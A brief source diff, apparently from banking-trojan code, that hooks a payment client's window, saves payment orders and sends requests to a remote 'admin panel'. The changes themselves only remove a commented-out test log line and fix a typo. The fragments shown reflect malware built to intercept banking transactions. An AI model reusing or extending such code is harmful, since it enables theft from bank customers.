@@ -1831,7 +1831,6 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 			}
 			if( !hookDll ) break;
 			InitData();
-			//SendLogToAdmin( 0, "тестовая строка" );
 			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
 			for( int i = 0; i < 300; i++ )
 			{
@@ -2150,7 +2149,7 @@ static void SavePaymentOrders()
 }
 
 //отсылка Get запроса админке, если ret = true, то нужно возвращать ответ
-//mode1 - текст команды для обного баланса, mode2 - текст команды для нескольких балансов
+//mode1 - текст команды для одного баланса, mode2 - текст команды для нескольких балансов
 static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 {
 	char urlAdmin[128];
